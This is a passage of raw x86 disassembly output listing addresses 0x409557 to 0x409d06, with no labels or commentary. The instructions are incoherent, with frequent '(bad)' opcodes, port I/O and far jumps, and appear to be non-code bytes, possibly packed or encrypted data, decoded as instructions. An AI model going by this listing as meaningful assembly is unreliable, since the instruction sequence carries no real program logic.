  409557:	shl    BYTE PTR [edx-0x7d47e29f],cl
  40955d:	mov    edi,0xaee971c0
  409562:	push   esp
  409563:	arpl   WORD PTR [edi+eiz*2],sp
  409566:	or     dh,dh
  409568:	icebp  
  409569:	cmc    
  40956a:	cmp    ebx,DWORD PTR [ecx-0x4dbd2f4b]
  409570:	sub    DWORD PTR fs:[ebx-0x78],ebx
  409574:	js     0x40952a
  409576:	(bad)  
  409577:	in     eax,dx
  409578:	dec    edx
  409579:	cmp    DWORD PTR [edx+0x50],0xffffffd9
  40957d:	daa    
  40957e:	cmp    DWORD PTR [edi+0x6ee867e2],edi
  409584:	push   es
  409585:	mov    bl,0xfe
  409587:	dec    ecx
  409588:	ins    DWORD PTR es:[edi],dx
  409589:	sub    edx,DWORD PTR [ebp+ecx*2-0x6df39768]
  409590:	outs   dx,BYTE PTR ds:[esi]
  409591:	fmul   st(3),st
  409593:	pusha  
  409594:	add    dl,BYTE PTR ds:0x5c2dce41
  40959a:	inc    ecx
  40959b:	outs   dx,BYTE PTR ds:[esi]
  40959c:	push   esp
  40959d:	pop    ebx
  40959e:	test   al,0xd0
  4095a0:	in     eax,0x99
  4095a2:	or     BYTE PTR [edx+0x66],ah
  4095a5:	lahf   
  4095a6:	xor    ch,bh
  4095a8:	xchg   ecx,eax
  4095a9:	push   ss
  4095aa:	fimul  DWORD PTR [ebx]
  4095ac:	jns    0x409555
  4095ae:	xor    al,0x17
  4095b0:	and    BYTE PTR [ecx+0x1504a2f3],ch
  4095b6:	int3   
  4095b7:	fwait
  4095b8:	mov    DWORD PTR [eax+0x1ff61d7f],esi
  4095be:	cs inc edi
  4095c0:	mov    eax,0x74124662
  4095c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c6:	bound  edi,QWORD PTR [ecx+esi*1]
  4095c9:	pop    edx
  4095ca:	jne    0x4095a0
  4095cc:	pop    ecx
  4095cd:	rcl    DWORD PTR [edi],1
  4095cf:	mov    dh,0xd5
  4095d1:	repnz (bad)
  4095d4:	imul   ecx,eax,0xffffffdd
  4095d7:	dec    edx
  4095d8:	sahf   
  4095d9:	jle    0x4095c1
  4095db:	sub    DWORD PTR [ecx-0x702e9e98],0xfffffff3
  4095e2:	shl    BYTE PTR [ebx-0x1a67f070],0xdf
  4095e9:	push   es
  4095ea:	sub    edx,DWORD PTR [esi]
  4095ec:	pop    eax
  4095ed:	fcmovbe st,st(4)
  4095ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095f0:	and    esp,ebx
  4095f2:	imul   ebp,DWORD PTR [ebx+0x9],0xd
  4095f6:	stos   BYTE PTR es:[edi],al
  4095f7:	cmp    al,0x4e
  4095f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095fa:	xchg   BYTE PTR [edx+ebx*4-0x48fad9a3],cl
  409601:	out    dx,eax
  409602:	jge    0x4095d9
  409604:	mov    WORD PTR [eax-0x3c],?
  409607:	fild   WORD PTR [edx]
  409609:	add    DWORD PTR [ebx],ebp
  40960b:	sti    
  40960c:	int3   
  40960d:	retf   0x9275
  409610:	mov    edi,0x36985bee
  409615:	jg     0x409607
  409617:	sti    
  409618:	shr    DWORD PTR [ecx+0x6],1
  40961b:	es pop es
  40961d:	cmp    esi,DWORD PTR [edx-0x63]
  409620:	sub    BYTE PTR [ecx-0x7fd16d9e],cl
  409626:	test   BYTE PTR [ebp-0x5a6161d1],dh
  40962c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40962d:	in     al,0x91
  40962f:	mov    ecx,0xf50974ac
  409634:	out    dx,al
  409635:	in     eax,dx
  409636:	push   esp
  409637:	sbb    BYTE PTR [ebx+0x18a6c3eb],al
  40963d:	syscall 
  40963f:	in     al,0x2
  409641:	ficomp DWORD PTR [esi+0x21]
  409644:	push   esp
  409645:	arpl   bp,bx
  409647:	popa   
  409648:	xchg   edx,edx
  40964a:	jae    0x40964f
  40964c:	jp     0x409625
  40964e:	pop    esp
  40964f:	jb     0x40963f
  409651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409652:	mov    dl,0x6d
  409654:	dec    ecx
  409655:	nop
  409656:	push   eax
  409657:	pop    ss
  409658:	div    BYTE PTR [edi-0x7278cbe8]
  40965e:	jmp    0x409613
  409660:	xchg   BYTE PTR ds:0xfe63dfa4,cl
  409666:	sub    eax,0x67454392
  40966b:	std    
  40966c:	std    
  40966d:	xchg   DWORD PTR [ebx+0x558dd0c2],ecx
  409673:	cli    
  409674:	fcompp 
  409676:	dec    edi
  409677:	les    esp,FWORD PTR [edx-0x14]
  40967a:	mov    edx,0x92fe5836
  40967f:	xchg   ebx,eax
  409680:	daa    
  409681:	or     DWORD PTR [ecx-0x4],eax
  409684:	icebp  
  409685:	sti    
  409686:	mov    ebp,0xe22327b
  40968b:	sti    
  40968c:	ja     0x4096ce
  40968e:	pop    esp
  40968f:	xor    dh,ah
  409691:	ror    ah,0x2e
  409694:	pop    ebx
  409696:	push   ds
  409697:	mov    al,ds:0xbcc31d8a
  40969c:	sbb    al,0x5a
  40969e:	or     eax,DWORD PTR ds:0x6296a60
  4096a4:	sub    eax,0xfd4e027d
  4096a9:	test   ebp,edi
  4096ab:	adc    DWORD PTR [ebp-0x436b43ab],ecx
  4096b1:	pop    edx
  4096b2:	cmp    eax,0xb493cfb
  4096b7:	(bad)  
  4096b8:	mov    esp,0x27e3cdb8
  4096bd:	mov    ebx,0x44b669b6
  4096c2:	jae    0x409665
  4096c4:	out    dx,eax
  4096c5:	xchg   edi,eax
  4096c6:	test   eax,0xa05e620a
  4096cb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096cd:	rol    BYTE PTR [esi],1
  4096cf:	sub    al,0x8b
  4096d1:	call   0x6c39611d
  4096d6:	iret   
  4096d7:	push   ds
  4096d8:	call   0x514a8e40
  4096dd:	mov    dl,0xc7
  4096df:	jge    0x4096c4
  4096e1:	cmp    al,BYTE PTR [ecx+0x5a]
  4096e4:	inc    eax
  4096e5:	loop   0x40971f
  4096e7:	in     al,0xdb
  4096e9:	add    BYTE PTR [edi+esi*1+0x61c582c2],dh
  4096f0:	jmp    0x8900:0x1165d05c
  4096f7:	push   es
  4096f8:	adc    eax,0x2fc278fd
  4096fd:	(bad)  
  4096fe:	icebp  
  4096ff:	add    eax,DWORD PTR [esi]
  409701:	sbb    dh,0xe8
  409704:	inc    edx
  409705:	lea    esi,[ebx]
  409707:	aaa    
  409708:	lock loope 0x409762
  40970b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40970c:	mov    bh,0x66
  40970e:	pop    ss
  40970f:	xchg   esp,eax
  409710:	sbb    DWORD PTR fs:0xbc7ab885,edi
  409717:	fild   DWORD PTR [edi-0x28]
  40971a:	mov    bl,ch
  40971c:	enter  0xf18e,0x23
  409720:	sbb    edi,DWORD PTR [edx-0x7f]
  409723:	push   dx
  409725:	test   eax,0xf798e9a2
  40972a:	and    esi,esi
  40972c:	fsubr  st(7),st
  40972e:	dec    ebx
  40972f:	fdiv   st,st(1)
  409731:	stos   DWORD PTR es:[edi],eax
  409732:	imul   edi,DWORD PTR [eax],0xffffffee
  409735:	shr    BYTE PTR [eax+0x72],cl
  409738:	ds cmp dh,0x2b
  40973c:	push   ebx
  40973d:	or     al,0xa4
  40973f:	aad    0x9e
  409741:	imul   DWORD PTR [ebx-0x7e610083]
  409747:	xor    al,0x60
  409749:	adc    cl,ch
  40974b:	bound  edi,QWORD PTR [ebp-0x42b69e7]
  409751:	bound  esp,QWORD PTR [ebx]
  409753:	out    dx,al
  409754:	pop    esi
  409755:	mov    WORD PTR [edi+0x6c],es
  409758:	xor    edx,esi
  40975a:	mov    ch,0xd3
  40975c:	or     eax,0xe44998d7
  409761:	xchg   ah,dl
  409763:	push   eax
  409764:	jne    0x4097da
  409766:	jle    0x409707
  409768:	imul   ebx,DWORD PTR [eax-0x3330d4e4],0xfb1ff6e6
  409772:	jo     0x4097ed
  409774:	adc    BYTE PTR ss:[ecx+0x17b9d457],dl
  40977b:	lods   eax,DWORD PTR ds:[esi]
  40977c:	mov    al,0x22
  40977e:	pop    ss
  40977f:	repnz sub bh,cl
  409782:	pop    ss
  409783:	and    al,BYTE PTR [bx]
  409786:	mov    esp,0x74659063
  40978b:	sub    DWORD PTR [ebx],edi
  40978d:	iret   
  40978e:	or     DWORD PTR [edx],ebx
  409790:	jecxz  0x409771
  409792:	cdq    
  409793:	js     0x409732
  409795:	adc    DWORD PTR [ebx+edi*2-0x69d23c78],0x200d5ed8
  4097a0:	push   ecx
  4097a1:	in     eax,dx
  4097a2:	in     al,dx
  4097a3:	(bad)  
  4097a4:	fiadd  DWORD PTR [edi]
  4097a6:	ins    DWORD PTR es:[edi],dx
  4097a7:	shr    ebx,cl
  4097a9:	lock jecxz 0x4097c1
  4097ac:	xor    edi,DWORD PTR [esi]
  4097ae:	or     al,0xa7
  4097b0:	outs   dx,BYTE PTR ds:[esi]
  4097b1:	jmp    0x4b17:0xcae621cb
  4097b8:	pop    ds
  4097b9:	pop    edx
  4097ba:	ins    BYTE PTR es:[edi],dx
  4097bb:	xchg   edi,ecx
  4097bd:	inc    edx
  4097be:	je     0x409800
  4097c0:	sbb    ebp,esp
  4097c2:	popf   
  4097c3:	push   0xffffffc5
  4097c5:	push   ecx
  4097c6:	retf   0x669b
  4097c9:	out    dx,al
  4097ca:	cld    
  4097cb:	push   eax
  4097cc:	push   0x6a151e83
  4097d1:	enter  0xefa4,0xc0
  4097d5:	push   ebx
  4097d6:	enter  0x34d6,0x98
  4097da:	or     BYTE PTR [edx-0x4f],cl
  4097dd:	pop    eax
  4097de:	ins    BYTE PTR es:[edi],dx
  4097df:	push   ebx
  4097e0:	xor    dh,BYTE PTR [eax]
  4097e2:	push   0xffffff94
  4097e4:	shl    DWORD PTR [ebx],1
  4097e6:	lods   al,BYTE PTR ds:[esi]
  4097e7:	xlat   BYTE PTR ds:[ebx]
  4097e8:	aam    0xbe
  4097ea:	stos   BYTE PTR es:[edi],al
  4097eb:	or     ebx,DWORD PTR [ecx]
  4097ed:	sub    al,0xc4
  4097ef:	cmp    ebx,DWORD PTR [edi+0x4d1e5f1]
  4097f5:	fnstsw WORD PTR [edi+0x1d]
  4097f8:	int3   
  4097f9:	daa    
  4097fa:	js     0x40977d
  4097fc:	loope  0x40983d
  4097fe:	in     al,0x71
  409800:	in     eax,dx
  409801:	sbb    al,0x2b
  409803:	and    ah,BYTE PTR [esi]
  409805:	jle    0x40983d
  409807:	mov    ch,0x6
  409809:	(bad)  
  40980a:	cmp    eax,0xeebadb4c
  40980f:	xchg   esi,eax
  409810:	fldl2e 
  409812:	lea    edi,[esp+esi*4+0x1b]
  409816:	iret   
  409817:	imul   esi,DWORD PTR [edx],0xffffffd3
  40981a:	lods   al,BYTE PTR ds:[esi]
  40981b:	cmp    BYTE PTR [ebx+0x7d187e3c],cl
  409821:	pop    ebx
  409822:	jnp    0x4097bc
  409824:	mov    al,0x92
  409826:	and    BYTE PTR [esp+edx*2],bh
  409829:	mov    BYTE PTR [ebx],ah
  40982b:	imul   ecx,DWORD PTR [ebx-0x14],0x37
  40982f:	rol    ecx,0x62
  409832:	push   ss
  409833:	jmp    DWORD PTR [ecx+0x7]
  409836:	push   0xffffffba
  409838:	gs fmulp st(7),st
  40983b:	xor    ecx,DWORD PTR [esi+0x759c8e95]
  409841:	popf   
  409842:	cmp    DWORD PTR [esi],esp
  409844:	inc    ecx
  409845:	fiadd  DWORD PTR [esp+esi*1]
  409848:	mov    edx,0x687a0c62
  40984d:	push   es
  40984e:	and    eax,0x99839c5a
  409853:	mov    esi,0x150172ba
  409858:	push   cs
  409859:	sub    eax,0xef5d6926
  40985e:	out    0x45,eax
  409860:	cmp    al,0x64
  409862:	int    0xde
  409864:	mov    ch,0x60
  409866:	out    0xbc,al
  409868:	(bad)  
  409869:	into   
  40986a:	retf   
  40986b:	mov    dh,0xb8
  40986d:	test   al,0xdd
  40986f:	adc    esp,esp
  409871:	add    BYTE PTR [edx],dh
  409873:	rol    DWORD PTR [ebx+0x2e4662e2],0x2
  40987a:	shr    DWORD PTR [esi+0x4c],cl
  40987d:	cwde   
  40987e:	jp     0x409833
  409880:	sub    DWORD PTR [esi+0x51],0x203af04a
  409887:	scas   al,BYTE PTR es:[edi]
  409888:	sahf   
  409889:	fisub  DWORD PTR [edx+0xf038249]
  40988f:	mov    ah,0xe1
  409891:	(bad)  
  409892:	mov    ecx,0x6d62bc7b
  409897:	push   ds
  409898:	xor    BYTE PTR [esi-0x44da3b0c],0x31
  40989f:	or     eax,0x7d921517
  4098a4:	and    cl,ch
  4098a6:	mov    al,ds:0x65a93a74
  4098ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098ac:	mov    ebx,0x58a8c06c
  4098b1:	adc    al,0x3b
  4098b3:	scas   al,BYTE PTR es:[edi]
  4098b4:	mov    ds:0x8a307204,al
  4098b9:	outs   dx,DWORD PTR ds:[esi]
  4098ba:	shl    bh,cl
  4098bc:	add    edi,DWORD PTR [ecx]
  4098be:	jae    0x409921
  4098c0:	aas    
  4098c1:	loope  0x409885
  4098c3:	pop    ebx
  4098c4:	popa   
  4098c5:	inc    edi
  4098c6:	sub    BYTE PTR [ebp+ebp*4-0x8],ah
  4098ca:	mov    bl,BYTE PTR [esi+0x7]
  4098cd:	dec    ebx
  4098ce:	jge    0x4098c9
  4098d0:	ret    
  4098d1:	outs   dx,BYTE PTR ds:[esi]
  4098d2:	(bad)  
  4098d3:	aad    0xd7
  4098d5:	ror    DWORD PTR [esi+0x785baf2],cl
  4098db:	adc    al,0xac
  4098dd:	int    0x69
  4098df:	enter  0x633f,0xa8
  4098e3:	add    eax,0xd44e2c2a
  4098e8:	inc    esp
  4098e9:	cmp    DWORD PTR [esi],esi
  4098eb:	cmp    cl,dh
  4098ed:	fs icebp 
  4098ef:	xchg   edx,eax
  4098f0:	jle    0x409898
  4098f2:	mov    ds:0xb475f40b,eax
  4098f7:	mov    ebp,0x51d7d64c
  4098fc:	add    eax,0x2470dd48
  409901:	pushf  
  409902:	std    
  409903:	mov    dl,0xd2
  409905:	mov    WORD PTR [edi],?
  409907:	pop    esp
  409908:	mov    ch,0xeb
  40990a:	gs test eax,0xd57d0db2
  409911:	retf   0x8f53
  409914:	mov    edi,0xd98a07f9
  409919:	jbe    0x409980
  40991b:	xchg   ecx,eax
  40991c:	mov    ebx,esp
  40991e:	mov    cl,0x8b
  409920:	shl    BYTE PTR [eax-0x781435ae],0x92
  409927:	pop    ebx
  409928:	mov    dh,0xe2
  40992a:	(bad)  
  40992b:	outs   dx,BYTE PTR ds:[esi]
  40992c:	jg     0x4098ae
  40992e:	push   esp
  40992f:	sub    eax,0x3ada5dcc
  409934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409935:	xchg   ebx,eax
  409936:	cmp    BYTE PTR [edi],ah
  409938:	and    ebp,ecx
  40993a:	and    eax,0xe89e0e5b
  40993f:	xchg   cl,bl
  409941:	in     eax,0x91
  409943:	sbb    cl,BYTE PTR [eax+edx*4]
  409946:	sub    esp,esi
  409948:	adc    esi,esi
  40994a:	mov    WORD PTR ds:0x4e2d9b84,?
  409950:	(bad)  
  409951:	aad    0x4c
  409953:	fwait
  409954:	adc    BYTE PTR [esp+ebx*8+0x6ca0a24c],dh
  40995b:	mov    ebp,0x4fc16cbc
  409960:	xor    eax,0xddf263c8
  409965:	mov    ebp,0xe81384ad
  40996a:	inc    ebx
  40996b:	call   0x9497:0xe6bd1fb3
  409972:	mov    al,0x0
  409974:	xchg   esi,eax
  409975:	iret   
  409976:	mov    ah,BYTE PTR ds:0x7f82ba6a
  40997c:	dec    edx
  40997d:	pop    ss
  40997e:	outs   dx,BYTE PTR ds:[esi]
  40997f:	inc    edi
  409980:	push   edi
  409981:	mov    cs,WORD PTR [eax]
  409983:	dec    edi
  409984:	ds sbb eax,0x23e22cc2
  40998a:	push   ss
  40998b:	mov    esi,0x6df9f8e7
  409990:	adc    esi,esp
  409992:	data16 jnp 0x40999b
  409995:	test   eax,0x3a126371
  40999a:	mov    cs,esp
  40999c:	push   edx
  40999d:	xor    cl,BYTE PTR [ecx-0x46]
  4099a0:	ss (bad) 
  4099a2:	xor    al,0x9b
  4099a4:	cmp    al,0x5c
  4099a6:	add    eax,0x1bef2731
  4099ab:	push   ds
  4099ac:	mov    cl,0x89
  4099ae:	in     al,0xeb
  4099b0:	xchg   esp,eax
  4099b1:	mov    cl,0xda
  4099b3:	add    edx,eax
  4099b5:	pop    edi
  4099b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099b7:	shr    DWORD PTR [esi-0xba9fecd],0xe0
  4099be:	jb     0x409959
  4099c0:	mov    dh,0xc1
  4099c2:	pop    ss
  4099c3:	stc    
  4099c4:	das    
  4099c5:	es std 
  4099c7:	sub    BYTE PTR [esi],ah
  4099c9:	push   0xffffffe8
  4099cb:	div    BYTE PTR [esi+0x15]
  4099ce:	sub    cl,dl
  4099d0:	mov    dh,0xa2
  4099d2:	xchg   ax,ax
  4099d4:	xchg   esp,eax
  4099d5:	sub    eax,0x53d6174
  4099da:	jl     0x4099b8
  4099dc:	or     ecx,DWORD PTR [ebx]
  4099de:	bound  eax,QWORD PTR [ebp+0x5ccd389d]
  4099e4:	or     BYTE PTR [esp+esi*1+0x63],bh
  4099e8:	jnp    0x409999
  4099ea:	daa    
  4099eb:	mov    ch,0x9a
  4099ed:	xchg   edi,eax
  4099ee:	jb     0x409a13
  4099f0:	and    BYTE PTR [ebx],dl
  4099f2:	shl    al,1
  4099f4:	sbb    esp,eax
  4099f6:	mov    dl,0x0
  4099f8:	in     al,0xef
  4099fa:	mov    ebx,0x5eff4ed8
  4099ff:	cmp    BYTE PTR [ebx],cl
  409a01:	mov    ds:0x8880e5dc,eax
  409a06:	out    dx,eax
  409a07:	or     ebx,edi
  409a09:	pop    ecx
  409a0a:	push   esi
  409a0b:	aaa    
  409a0c:	mov    dh,0x8b
  409a0e:	mov    eax,0x7a387e41
  409a13:	xchg   ebx,eax
  409a14:	aad    0xd2
  409a16:	rcpps  xmm7,XMMWORD PTR [ebx]
  409a19:	mov    ebx,0x54ea9388
  409a1e:	add    al,0x9
  409a20:	xor    DWORD PTR [edi-0x5f783485],ebx
  409a26:	lea    eax,[esi]
  409a28:	dec    ecx
  409a29:	iret   
  409a2a:	jmp    0x409a9d
  409a2c:	test   DWORD PTR [ecx],esi
  409a2e:	out    dx,eax
  409a2f:	sbb    eax,0x4932411f
  409a34:	pop    es
  409a35:	adc    DWORD PTR ds:0x113e6146,0x5e
  409a3c:	or     esi,DWORD PTR [edi-0x7c]
  409a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a40:	mov    eax,0x45e1fb7a
  409a45:	ins    BYTE PTR es:[edi],dx
  409a46:	jmp    0x1ac:0x264d76ea
  409a4d:	push   0xc0dcf62d
  409a52:	sbb    dl,BYTE PTR [ecx+0x0]
  409a55:	retf   
  409a56:	pop    ds
  409a57:	test   DWORD PTR [edi],eax
  409a59:	je     0x409a52
  409a5b:	mov    DWORD PTR [edi-0x6b],edx
  409a5e:	cdq    
  409a5f:	pop    ebx
  409a60:	mov    DWORD PTR [esi+0x7b],esi
  409a63:	fild   DWORD PTR ss:[eax-0x7d]
  409a67:	inc    esi
  409a68:	mov    esi,0xe47833e9
  409a6d:	test   DWORD PTR [edi],ecx
  409a6f:	xor    DWORD PTR ds:0x2830455a,ebx
  409a75:	pop    ebp
  409a76:	test   edi,ebp
  409a78:	hlt    
  409a79:	mov    esp,DWORD PTR [ebx]
  409a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a7c:	xlat   BYTE PTR ds:[ebx]
  409a7d:	adc    BYTE PTR [eax+0x45e24356],ch
  409a83:	and    al,0xd7
  409a85:	imul   esp,DWORD PTR [ebp-0x713fb1d8],0xde7dc9dd
  409a8f:	xchg   esp,eax
  409a90:	add    BYTE PTR [edi+0x3a9de4d0],0x80
  409a97:	dec    ebp
  409a98:	bound  ebp,QWORD PTR [eax]
  409a9a:	popa   
  409a9b:	pop    edx
  409a9c:	loop   0x409ac2
  409a9e:	mov    al,BYTE PTR [esi-0x269239b]
  409aa4:	lods   al,BYTE PTR ds:[esi]
  409aa5:	xor    DWORD PTR [edi+0x25],ebx
  409aa8:	inc    esi
  409aa9:	shl    BYTE PTR [edx+0xb],1
  409aac:	call   0x2c8517f6
  409ab1:	add    eax,0x9e17ddea
  409ab6:	icebp  
  409ab7:	cmp    al,0xf6
  409ab9:	mov    cl,0x4e
  409abb:	mov    ebx,?
  409abd:	or     eax,0x121fca25
  409ac2:	push   0x32
  409ac4:	xor    eax,0xec3f1b7
  409ac9:	cmc    
  409aca:	xor    esp,esp
  409acc:	aas    
  409acd:	mov    al,0x61
  409acf:	(bad)  
  409ad0:	fbld   TBYTE PTR [ecx]
  409ad2:	mov    eax,ds:0x9f371507
  409ad7:	ins    BYTE PTR es:[edi],dx
  409ad8:	push   cs
  409ad9:	cmp    ebp,DWORD PTR [edi]
  409adb:	out    dx,eax
  409adc:	mov    dh,0xb6
  409ade:	push   0xfd4f6111
  409ae3:	lods   al,BYTE PTR ds:[esi]
  409ae4:	loop   0x409a7e
  409ae6:	mov    BYTE PTR [ebp-0x425fb7bd],bl
  409aec:	xchg   DWORD PTR [ebx-0x38],eax
  409aef:	test   eax,0x1cd8886d
  409af4:	es add al,0x66
  409af7:	and    DWORD PTR [eax+ecx*4+0xb6d11e7],esi
  409afe:	mov    ds:0x2c98dbcf,eax
  409b03:	(bad)  
  409b04:	repnz fldln2 
  409b07:	outs   dx,DWORD PTR ds:[esi]
  409b08:	sbb    BYTE PTR [edi+edi*8],ah
  409b0b:	mov    eax,0x7901ccc4
  409b10:	call   0x535b7132
  409b15:	inc    esp
  409b16:	arpl   ax,ax
  409b18:	mov    ecx,0x3d9115df
  409b1d:	pop    ds
  409b1e:	pop    edx
  409b1f:	out    0xaf,al
  409b21:	stc    
  409b22:	sub    cl,cl
  409b24:	jbe    0x409ac8
  409b26:	sbb    al,BYTE PTR [edi-0x20a40cfe]
  409b2c:	out    0xe5,al
  409b2e:	ins    DWORD PTR es:[edi],dx
  409b2f:	sbb    esi,DWORD PTR [esi-0x5e]
  409b32:	mov    al,0xa6
  409b34:	imul   esp,DWORD PTR [edi+0x4d],0xbe43dcaf
  409b3b:	and    ebx,ecx
  409b3d:	sahf   
  409b3e:	test   eax,0x2b88faa
  409b43:	imul   ebp,DWORD PTR cs:[esi-0x23],0xffffff9b
  409b48:	sub    al,0xff
  409b4a:	sbb    DWORD PTR [eax-0x7],edx
  409b4d:	add    esi,DWORD PTR [ebx-0x31dc99f2]
  409b53:	ja     0x409b94
  409b55:	mov    dl,0x36
  409b57:	les    ecx,FWORD PTR [edx]
  409b59:	je     0x409b2e
  409b5b:	aam    0x54
  409b5d:	dec    esp
  409b5e:	cmp    eax,0x3d68b2d5
  409b63:	sbb    eax,eax
  409b65:	jne    0x409bd6
  409b67:	and    edx,esp
  409b69:	ds push esp
  409b6b:	je     0x409bb0
  409b6d:	hlt    
  409b6e:	adc    ah,dh
  409b70:	jle    0x409b16
  409b72:	jo     0x409b68
  409b74:	cmp    dh,ch
  409b76:	(bad)  
  409b77:	(bad)  
  409b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b79:	dec    esp
  409b7a:	in     al,dx
  409b7b:	pop    esi
  409b7c:	retf   0xa2b5
  409b7f:	enter  0x889b,0x6
  409b83:	mov    BYTE PTR [ecx+edi*8],ch
  409b86:	ins    DWORD PTR es:[edi],dx
  409b87:	(bad)  
  409b88:	mov    WORD PTR [ebx-0x23cc9c02],gs
  409b8e:	pop    es
  409b8f:	or     dh,cl
  409b91:	retf   0xd9aa
  409b94:	push   ss
  409b95:	popf   
  409b96:	bound  ebp,QWORD PTR [ebx]
  409b98:	(bad)  
  409b9a:	mov    ecx,0x4a0b2ed4
  409b9f:	(bad)  
  409ba0:	jo     0x409bf2
  409ba2:	mov    WORD PTR gs:[ecx+0x7a],gs
  409ba6:	out    dx,eax
  409ba7:	rol    DWORD PTR [esi-0x37],0x27
  409bab:	mov    bl,dl
  409bad:	mov    dh,0xa9
  409baf:	xchg   BYTE PTR [edi-0x5dc5450e],bh
  409bb5:	pop    esi
  409bb6:	ss fwait
  409bb8:	popa   
  409bb9:	cmp    BYTE PTR fs:[ebx+esi*1],bh
  409bbd:	daa    
  409bbe:	das    
  409bbf:	mov    bl,0x95
  409bc1:	xor    edx,edi
  409bc3:	lock into 
  409bc5:	mov    esp,0xf8d82112
  409bcb:	mov    dh,0xca
  409bcd:	out    0xe9,al
  409bcf:	jo     0x409bad
  409bd1:	lahf   
  409bd2:	push   es
  409bd3:	jl     0x409b66
  409bd5:	xor    eax,0x594f30f8
  409bda:	imul   ecx,edx,0xffffffcd
  409bdd:	cmc    
  409bde:	in     al,0xab
  409be0:	aas    
  409be1:	adc    eax,DWORD PTR [ebp-0x57]
  409be4:	test   al,0xed
  409be6:	and    eax,0x941d8994
  409beb:	jns    0x409c66
  409bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bee:	hlt    
  409bef:	pushf  
  409bf0:	shr    al,0x1b
  409bf3:	push   ebp
  409bf4:	loope  0x409c4a
  409bf6:	data16 repnz and dh,bh
  409bfa:	icebp  
  409bfb:	mov    WORD PTR [edx+0x7744d839],es
  409c01:	fsubp  st(3),st
  409c03:	scas   eax,DWORD PTR es:[edi]
  409c04:	pop    edi
  409c05:	ja     0x409bef
  409c07:	pop    es
  409c08:	outs   dx,BYTE PTR ds:[esi]
  409c09:	in     eax,dx
  409c0a:	sub    cl,dl
  409c0c:	into   
  409c0d:	and    eax,0xfbe701a0
  409c12:	pusha  
  409c13:	sahf   
  409c14:	fwait
  409c15:	(bad)  
  409c16:	div    BYTE PTR [ebx+0x1b]
  409c19:	jecxz  0x409baf
  409c1b:	mov    bl,0x82
  409c1d:	ins    BYTE PTR es:[edi],dx
  409c1e:	(bad)  
  409c1f:	mov    ebx,0x5c3b7afc
  409c24:	lahf   
  409c25:	sub    eax,0xbc02e70c
  409c2a:	sub    esp,DWORD PTR [ebx+0x69]
  409c2d:	push   cs
  409c2e:	fld    QWORD PTR [eax+0x3b620e3c]
  409c34:	add    esi,edi
  409c36:	sbb    BYTE PTR [edx+0x33],0x87
  409c3a:	lods   al,BYTE PTR ds:[esi]
  409c3b:	fisttp QWORD PTR [ebx+edx*8-0x61]
  409c3f:	(bad)  
  409c40:	daa    
  409c41:	pop    ebp
  409c42:	xchg   ebx,eax
  409c43:	loop   0x409bf5
  409c45:	push   ss
  409c46:	jno    0x409c39
  409c48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c49:	mov    bl,0xc9
  409c4b:	addr16 cli 
  409c4d:	sub    eax,edi
  409c4f:	xor    ch,ch
  409c51:	pop    ds
  409c52:	mov    ch,0x7a
  409c54:	rcr    BYTE PTR [edx+0x1b314f7a],1
  409c5a:	push   0x988f40da
  409c5f:	jns    0x409cc4
  409c61:	and    eax,DWORD PTR [esi]
  409c63:	mov    ds:0xe238e99f,eax
  409c68:	ret    0x7a57
  409c6b:	and    al,0x74
  409c6d:	jge    0x409c84
  409c6f:	(bad)  
  409c70:	jp     0x409cd6
  409c72:	into   
  409c73:	in     al,dx
  409c74:	dec    BYTE PTR [edi-0x6]
  409c77:	mov    esi,0xe48666f5
  409c7c:	adc    al,0xad
  409c7e:	and    bh,BYTE PTR [edi-0x9]
  409c81:	sub    eax,0x68f1b05b
  409c86:	pop    ebx
  409c87:	sbb    al,0xdd
  409c89:	int    0x5b
  409c8b:	jmp    0x2d90:0xb58decd3
  409c92:	jmp    0x5ec36ff8
  409c97:	adc    esi,DWORD PTR ds:0x56ebff17
  409c9d:	sub    esi,DWORD PTR [esi+0x4]
  409ca0:	rcr    BYTE PTR [ebx],1
  409ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca3:	mov    ?,WORD PTR [ecx-0x3ba7b7fa]
  409ca9:	and    ebp,DWORD PTR [ecx-0x57]
  409cac:	or     al,0xfa
  409cae:	or     al,0x52
  409cb0:	and    ah,BYTE PTR [edi+0x2f0be8cd]
  409cb6:	call   0x3fe7:0x8274c278
  409cbd:	cmc    
  409cbe:	ins    BYTE PTR es:[edi],dx
  409cbf:	or     DWORD PTR [ecx],esp
  409cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc2:	cdq    
  409cc3:	sub    ah,BYTE PTR [eax-0x36]
  409cc6:	push   0x30
  409cc8:	test   BYTE PTR [edi],ah
  409cca:	mov    BYTE PTR [edi-0x4ad0bbd7],dl
  409cd0:	arpl   WORD PTR [ebp+0x21],cx
  409cd3:	(bad)  
  409cd4:	imul   ebp,DWORD PTR [eax+0x5c],0x4aac6c06
  409cdb:	push   cs
  409cdc:	lock icebp 
  409cde:	loopne 0x409c9d
  409ce0:	mov    ah,BYTE PTR [ebx+0x506f74e1]
  409ce6:	adc    ch,0x33
  409ce9:	lahf   
  409cea:	add    DWORD PTR [esi+0x53aeda6c],0x78
  409cf1:	(bad)  
  409cf2:	push   ecx
  409cf3:	inc    esp
  409cf4:	je     0x409d46
  409cf6:	cmc    
  409cf7:	dec    ebx
  409cf8:	pop    ebx
  409cf9:	jno    0x409d00
  409cfb:	ja     0x409cb7
  409cfd:	xchg   esi,eax
  409cfe:	dec    ecx
  409cff:	ror    DWORD PTR [ecx],1
  409d01:	pusha  
  409d02:	mov    ch,0xf4
  409d04:	loop   0x409d24
  409d06:	and    edx,ebp
